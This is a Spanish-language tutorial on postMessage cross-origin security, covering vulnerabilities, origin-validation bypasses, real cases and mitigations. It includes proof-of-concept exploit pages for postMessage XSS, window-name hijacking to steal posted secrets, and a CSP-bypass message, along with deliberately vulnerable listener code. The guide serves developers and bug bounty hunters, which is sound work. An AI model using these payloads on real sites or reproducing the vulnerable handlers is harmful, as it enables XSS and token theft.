# PostMessage - Guía Completa de Comunicación Cross-Origin

PostMessage representa uno de los mecanismos más importantes y potencialmente peligrosos para la comunicación entre diferentes orígenes en aplicaciones web modernas. Esta API permite la transferencia segura de datos entre ventanas, iframes y workers, pero su implementación incorrecta puede abrir puertas a vulnerabilidades críticas.[^2]

## ¿Qué es un iframe?

Un iframe (Inline Frame) es un elemento HTML que permite incrustar otro documento HTML dentro del documento actual. La página embebida puede provenir de un origen completamente diferente, creando una barrera natural debido a la Same-Origin Policy (SOP).[^4][^5]

```html
<iframe src="https://victima.com/content.html" id="miFrame"></iframe>
```

Esta funcionalidad es esencial para integrar contenido de terceros como widgets de chat, sistemas de pago, mapas interactivos y publicidad, pero también introduce riesgos significativos de seguridad.

## ¿Qué es window.postMessage?

La API `window.postMessage()` proporciona un mecanismo seguro para que objetos Window puedan comunicarse entre sí, incluso cuando provienen de orígenes diferentes. Antes de postMessage, cualquier intento de acceder al contenido de un iframe de origen distinto resultaba en errores de seguridad.[^6]

### Componentes Clave de postMessage

**Origen (Origin):** Se define por la combinación de protocolo, dominio y puerto. Si cualquiera de estos difiere, se consideran orígenes distintos.[^6]

**Sintaxis de Envío:**

```javascript
targetWindow.postMessage(message, targetOrigin, [transfer]);
```

- `targetWindow`: Referencia al objeto window destino
- `message`: Datos a enviar (debe ser clonables estructuralmente)
- `targetOrigin`: Origen que debe tener targetWindow para recibir el mensaje
- `[transfer]`: Objetos Transferable opcionales

**Recepción de Mensajes:**

```javascript
window.addEventListener("message", (event) => {
  // SIEMPRE validar event.origin
  if (event.origin !== "https://origen-esperado.com") {
    return;
  }
  // Procesar event.data de forma segura
  console.log("Mensaje recibido:", event.data);
});
```

## Ejemplos Básicos de Comunicación

### Envío desde iframe al Padre

**Código del iframe (iframe-origin.com):**

```html
<button id="btnSendMessage">Enviar al Padre</button>
<script>
document.getElementById("btnSendMessage").addEventListener("click", () => {
  const mensaje = { info: "Hola desde el iframe!" };
  window.parent.postMessage(mensaje, "https://victima.com");
});
</script>
```

**Página Principal (victima.com):**

```html
<iframe src="https://iframe-origin.com/content.html" id="miIframe"></iframe>
<div id="respuesta">Esperando mensaje...</div>
<script>
window.addEventListener("message", (event) => {
  if (event.origin !== "https://iframe-origin.com") {
    return;
  }
  document.getElementById("respuesta").textContent = 
    "Mensaje: " + JSON.stringify(event.data);
});
</script>
```

### Envío desde Padre al iframe

**Página Principal:**

```html
<button id="btnEnviar">Enviar a iframe</button>
<iframe src="https://iframe-target.com/receptor.html" id="frame"></iframe>
<script>
document.getElementById("btnEnviar").addEventListener("click", () => {
  const iframe = document.getElementById('frame').contentWindow;
  const mensaje = { comando: 'ACTUALIZAR', valor: 'Nuevos datos' };
  iframe.postMessage(mensaje, 'https://iframe-target.com');
});
</script>
```

## Vulnerabilidades Críticas en postMessage

Las vulnerabilidades postMessage han causado compromisos significativos en servicios de Microsoft, Zoho y otros proveedores importantes. Microsoft descubrió múltiples vulnerabilidades de alto impacto que permitían robo de tokens y escalada de privilegios.[^1]

### Falta de Validación de Origen

**Escenario Vulnerable:**

```html
<!-- Página víctima -->
<iframe src="https://vulnerable-iframe.com/content.html" id="frame"></iframe>
<input type="text" id="msgInput" value="<img src=x onerror=alert('XSS')>">
<button id="btnRun">Enviar</button>
<script>
document.getElementById("btnRun").addEventListener("click", () => {
  const iframe = document.getElementById('frame').contentWindow;
  const mensaje = { 
    tipo: 'htmlDinamico', 
    contenido: document.getElementById('msgInput').value 
  };
  // VULNERABILIDAD: targetOrigin = '*'
  iframe.postMessage(mensaje, '*');
});
</script>
```

**iframe Vulnerable:**

```html
<div id="messageContainer">Contenido inicial</div>
<script>
window.addEventListener("message", (event) => {
  // VULNERABILIDAD: Sin validación de origen
  // if (event.origin !== "https://victima.com") return;
  
  if (event.data && event.data.tipo === 'htmlDinamico') {
    // VULNERABILIDAD: Uso directo de innerHTML
    document.getElementById('messageContainer').innerHTML = event.data.contenido;
  }
});
</script>
```

**Explotación por Atacante:**

```html
<!-- https://atacante.com/exploit.html -->
<iframe src="https://vulnerable-iframe.com/content.html" id="target"></iframe>
<script>
window.onload = () => {
  const iframe = document.getElementById('target').contentWindow;
  const payload = "<img src=x onerror=alert('XSS por atacante.com')>";
  const mensaje = { tipo: 'htmlDinamico', contenido: payload };
  iframe.postMessage(mensaje, "https://vulnerable-iframe.com");
};
</script>
```

### Robo de Tokens a Través de postMessage

Microsoft identificó casos donde tokens de autenticación eran enviados sin validación de origen:[^1]

```javascript
// Código vulnerable encontrado en Bing Travel
this.recorderModalIframe.contentWindow.postMessage(
  {accessToken: this.userAuthJwt}, 
  "*" // Wildcard peligroso
);
```

Un atacante puede interceptar estos tokens creando un iframe malicioso que escuche estos mensajes.[^1]

### Ataques Avanzados: Window Name Hijacking

Esta técnica explota ventanas con nombres predecibles:[^8]

**Página Vulnerable:**

```javascript
function start() {
  w = window.open("/win", "PREDICTABLE_NAME", "popup");
  setTimeout(() => {
    w.postMessage("SECRET_DATA", "*")
  }, 1000)
}
```

**Explotación:**

```html
<iframe src="https://victima.com/%00" name="PREDICTABLE_NAME"></iframe>
<script>
onclick = () => {
  window.open("https://victima.com");
  frame.onload = () => {
    frame.srcdoc = `<script>
      onmessage = (e) => alert('Robado: ' + e.data)
    <\/script>`;
  };
};
</script>
```

## Problemas en Validación de Origen

### Validaciones Incorrectas Comunes

**1. Uso Incorrecto de startsWith/endsWith:**

```javascript
// VULNERABLE
if (event.origin.startsWith("https://confiable.com")) {
  // Bypass: https://confiable.com.atacante.com
}

// VULNERABLE  
if (event.origin.endsWith(".confiable.com")) {
  // Bypass: https://cualquiera.confiable.com.atacante.com
}
```

**2. Expresiones Regulares Débiles:**

```javascript
// VULNERABLE - Falta anclaje de fin
if (/(http:|https:)\/\/([a-z0-9.]{1,}).ctfio.com/.test(event.origin)) {
  // Bypass: http://sub.ctfio.com.atacante.com
}

// CORRECTO
if (/^https?:\/\/([a-z0-9-]+\.)*ctfio\.com$/i.test(event.origin)) {
  // Anclajes ^ y $ previenen bypasses
}
```

**3. Uso de includes():**

```javascript
// VULNERABLE
if (event.origin.includes("confiable.com")) {
  // Bypass: https://atacante-confiable.com.net
}
```

## Ataques Reales Documentados

### Caso Microsoft Teams[^1]

Microsoft descubrió vulnerabilidades XSS 1-click y 0-click en Teams relacionadas con configuraciones postMessage permisivas. Las aplicaciones tenían `isFullTrust: true` y listas `validDomains` demasiado amplias.

### Caso Zoho[^7]

Zoho experimentó dos vulnerabilidades XSS críticas por manejo inseguro de postMessage, afectando múltiples aplicaciones y resultando en bounties de \$250 cada una.

### OAuth Token Theft[^9]

Investigadores demostraron cómo interceptar tokens OAuth explotando listeners postMessage débiles que filtran `location.href`, permitiendo robo de códigos de autorización.

## Técnicas de Explotación Avanzadas

### DOM XSS via postMessage[^11]

```html
<!-- Payload de explotación -->
<iframe src="https://target-lab.net/" 
        onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
</iframe>
```

### CSP Bypass con postMessage[^13]

PostMessage puede utilizarse para bypassear CSP cuando se combina con otras técnicas:

```javascript
// Si CSP permite 'self' y existe upload de archivos
frame.postMessage({
  type: 'loadScript',
  src: '/uploads/malicious.js'
}, '*');
```

### CSRF Sofisticado[^14]

PostMessage puede facilitar ataques CSRF sofisticados embebiendo sitios vulnerables en iframes y enviando mensajes para desencadenar acciones no deseadas.

## Sumideros Peligrosos (Dangerous Sinks)

Cuando `event.data` se pasa a estos sumideros sin sanitización:[^6]

- `element.innerHTML = event.data`
- `document.write(event.data)`
- `eval(event.data)`
- `element.setAttribute("href", event.data)` (si contiene `javascript:`)
- `new Function(event.data)()`
- Librerías que crean HTML dinámicamente: `$(element).html(event.data)`

## Metodología de Descubrimiento

### Identificación de PostMessage

1. **Buscar en código JavaScript:**
   - `window.addEventListener("message", ...)`
   - `targetWindow.postMessage(...)`
   - `$(window).on("message", ...)`
2. **Analizar Listeners:**
   - ¿Se valida `event.origin`?
   - ¿Cómo se valida?
   - ¿Qué se hace con `event.data`?
3. **Analizar Emisores:**
   - ¿Se usa `targetOrigin = '*'`?
   - ¿Es el mensaje sensible?

### Herramientas de Testing

**DOM Invader (Burp Suite):**[^16]

- Identifica automáticamente mensajes explotables
- Proporciona stack traces para debugging
- Permite envío de mensajes modificados

**Extensiones de Navegador:**

- **PMHook:** Intercepta mensajes postMessage
- **Posta:** Chrome extension para análisis postMessage

**Testing Manual con DevTools:**

```javascript
// Desde consola del padre
let iframe = document.getElementById('miIframe').contentWindow;
iframe.postMessage({test: "payload"}, "https://target.com");

// Desde consola del iframe
window.parent.postMessage({test: "payload"}, "https://parent.com");
```

## Mitigaciones y Mejores Prácticas

### Para Emisores (postMessage)

1. **Especificar targetOrigin preciso:**

```javascript
// CORRECTO
iframe.postMessage(mensaje, "https://trusted-domain.com");

// EVITAR (solo si el mensaje es público)
iframe.postMessage(mensaje, "*");
```

### Para Receptores (addEventListener)

1. **Validación rigurosa de origen:**

```javascript
window.addEventListener("message", (event) => {
  // Lista blanca de orígenes permitidos
  const allowedOrigins = [
    "https://trusted1.com",
    "https://trusted2.com"
  ];
  
  if (!allowedOrigins.includes(event.origin)) {
    console.warn("Origen no permitido:", event.origin);
    return;
  }
  
  // Procesar mensaje de forma segura
});
```

2. **Sanitización de datos:**

```javascript
// CORRECTO - Usar textContent
element.textContent = event.data.message;

// CORRECTO - Sanitizar HTML si es necesario
const clean = DOMPurify.sanitize(event.data.html);
element.innerHTML = clean;

// EVITAR - Inserción directa
element.innerHTML = event.data.html; // Peligroso
```

3. **Validación de estructura de mensaje:**

```javascript
window.addEventListener("message", (event) => {
  if (event.origin !== "https://trusted.com") return;
  
  // Validar estructura esperada
  if (!event.data || 
      typeof event.data.type !== 'string' ||
      typeof event.data.payload !== 'string') {
    return;
  }
  
  // Procesar solo tipos de mensaje conocidos
  switch(event.data.type) {
    case 'ALLOWED_ACTION':
      handleAllowedAction(event.data.payload);
      break;
    default:
      console.warn("Tipo de mensaje no reconocido:", event.data.type);
  }
});
```

### Iframe Sandboxing[^17]

```html
<iframe src="https://untrusted.com" 
        sandbox="allow-scripts allow-same-origin">
</iframe>
```

### Content Security Policy

```http
Content-Security-Policy: 
  default-src 'self'; 
  frame-src 'self' https://trusted-domains.com;
  script-src 'self' 'nonce-random123';
```

## Prevención en Frameworks Modernos

### React

```jsx
// Validación segura en React
useEffect(() => {
  const handleMessage = (event) => {
    if (event.origin !== 'https://trusted.com') return;
  
    // Usar estado local para actualizar componente
    setMessage(event.data.text); // React escapa automáticamente
  };
  
  window.addEventListener('message', handleMessage);
  return () => window.removeEventListener('message', handleMessage);
}, []);
```

### Angular

```typescript
@Component({...})
export class SecureComponent {
  @HostListener('window:message', ['$event'])
  handleMessage(event: MessageEvent) {
    if (event.origin !== 'https://trusted.com') return;
  
    // Angular sanitiza automáticamente
    this.message = event.data.text;
  }
}
```

## Consideraciones para Bug Bounty

Al buscar vulnerabilidades postMessage:

1. **Enfócate en aplicaciones complejas** con múltiples iframes
2. **Revisa OAuth flows** que usen postMessage para comunicación
3. **Prueba diferentes encodings** y payloads de bypass
4. **Combina con otras vulnerabilidades** como CSP bypass o CSRF
5. **Busca en funcionalidades de terceros** como widgets de chat, pagos

## Casos de Alto Impacto

PostMessage sigue siendo un vector de ataque crítico en 2024, especialmente en:

- **Aplicaciones empresariales** con integración de múltiples servicios
- **Plataformas OAuth** que manejan tokens sensibles
- **SaaS applications** con widgets embebidos
- **Aplicaciones bancarias** con componentes de terceros

La clave para una explotación exitosa está en identificar la ausencia de validación de origen y encontrar sumideros peligrosos donde `event.data` se procesa sin sanitización. Microsoft y Zoho son ejemplos recientes de cómo estas vulnerabilidades pueden tener impacto real en aplicaciones de producción.

Para los desarrolladores, la implementación de validación estricta de origen, sanitización de datos y el uso de frameworks seguros son fundamentales para prevenir estos ataques. Para los bug bounty hunters, comprender los patrones de comunicación cross-origin y las técnicas de evasión modernas es esencial para identificar vulnerabilidades que los scanners automatizados pueden pasar por alto.
<span style="display:none">[^19][^21][^23][^25][^27][^29][^31][^33][^35][^37][^39][^41][^43][^45][^47][^49][^51][^53]</span>

<div style="text-align: center">PostMessage - Guía Completa de Comunicación Cross-Origin</div>

[^1]: https://msrc.microsoft.com/blog/2025/08/postmessaged-and-compromised/
    
[^2]: https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage
    
[^3]: https://stackoverflow.com/questions/2187103/xss-security-communication-between-2-iframes-from-the-same-domain
    
[^4]: https://www.radware.com/cyberpedia/application-security/iframe-injection-xss/
    
[^5]: https://qrvey.com/blog/iframe-security/
    
[^6]: https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities
    
[^7]: https://infosecwriteups.com/behind-the-message-two-critical-xss-vulnerabilities-in-zohos-web-applications-86aa42887129
    
[^8]: https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss/postmessage-exploitation
    
[^9]: https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/
    
[^10]: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages
    
[^11]: https://cqr.company/web-vulnerabilities/dom-xss-using-web-messages/
    
[^12]: https://www.browserstack.com/guide/csp-bypass
    
[^13]: https://www.vaadata.com/blog/content-security-policy-bypass-techniques-and-security-best-practices/
    
[^14]: https://secinfodb.wordpress.com/2016/06/11/postmessage-sophisticated-csrf/
    
[^15]: https://trustfoundry.net/2024/07/30/a-quick-introduction-to-postmessage-xss/
    
[^16]: https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/web-message-dom-xss
    
[^17]: https://web.dev/articles/sandboxed-iframes
    
[^18]: https://www.less-secure.com/p/cross-origin-attacks-types-examples.html
    
[^19]: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
    
[^20]: https://abrictosecurity.com/attacks-you-should-know-about-cross-origin-resource-sharing/
    
[^21]: https://cybercx.com.au/blog/post-message-vulnerabilities/
    
[^22]: https://www.reflectiz.com/blog/iframe-security/
    
[^23]: https://akimbocore.com/article/html5-cross-domain-messaging-postmessage-vulnerabilities/
    
[^24]: https://nvd.nist.gov/vuln/detail/CVE-2024-10858
    
[^25]: https://writeups.io/summaries/detailed-technical-analysis-of-sandbox-iframe-xss-challenge-solution/
    
[^26]: https://www.secureideas.com/blog/being-safe-and-secure-with-cross-origin-messaging
    
[^27]: https://nvd.nist.gov/vuln/detail/CVE-2024-55541
    
[^28]: https://qualityminds.com/en/angular-security-part-2-proactive-xss-protection-with-the-iframe-sandbox/
    
[^29]: https://www.linkedin.com/posts/bijaysenihang_what-is-cross-origin-messaging-attack-in-activity-7333377395040653312-RDv6
    
[^30]: https://wpscan.com/vulnerability/7fecba37-d718-4dd4-89f3-285fb36a4165/
    
[^31]: https://jscrambler.com/blog/improving-iframe-security
    
[^32]: https://www.geeksforgeeks.org/javascript/how-to-avoid-receiving-postmessages-from-attackers/
    
[^33]: https://www.reddit.com/r/reactjs/comments/1cfmkrs/iframe_security_risk/
    
[^34]: https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/
    
[^35]: https://stackoverflow.com/questions/50480198/how-to-correctly-postmessage-into-an-iframe-that-has-sandbox-attribute-enabled
    
[^36]: https://hackerone.com/reports/398054
    
[^37]: https://portswigger.net/research/using-form-hijacking-to-bypass-csp
    
[^38]: https://www.cobalt.io/blog/csp-and-bypasses
    
[^39]: https://ahmed-tarek.gitbook.io/security-notes/pentesting/wep-pen/owsap-top-10/software-and-data-integrity-failures/postmessage-vulnerabilities/postmessage-vulnerabilities
    
[^40]: https://infosecwriteups.com/dom-xss-exploit-using-postmessage-and-json-parse-in-iframe-attacks-fc312eaa48c2
    
[^41]: https://projectdiscovery.io/blog/csp-bypass-dast-nuclei-templates-v10-1-5
    
[^42]: https://notes.theoffsecgirl.com/04-hacking-web/04c-ataques-al-cliente
    
[^43]: https://notes.theoffsecgirl.com/03-descubrimiento-y-fuzzing/03b-explotando-git-expuesto
    
[^44]: https://notes.theoffsecgirl.com/04-hacking-web/04d-redirecciones-inseguras
    
[^45]: https://jub0bs.com/posts/2023-05-05-smorgasbord-of-a-bug-chain/
    
[^46]: https://jlajara.gitlab.io/Dom_XSS_PostMessage
    
[^47]: https://techcommunity.microsoft.com/blog/microsoft-entra-blog/how-to-break-the-token-theft-cyber-attack-chain/4062700
    
[^48]: https://www.cs.utexas.edu/~shmat/shmat_ndss13postman.pdf
    
[^49]: https://payatu.com/blog/postmessage-vulnerabilities/
    
[^50]: https://cybercx.com/blog/postmessage-vulnerabilities/
    
[^51]: https://bugbase.ai/blog/exploiting-post-message-vulnerabilities-for-fun-and-profit
    
[^52]: https://stackoverflow.com/questions/56604306/how-is-window-postmessage-secure
    
[^53]: https://docs.prismacloud.io/en/enterprise-edition/policy-reference/sast-policies/javascript-policies/sast-policy-74
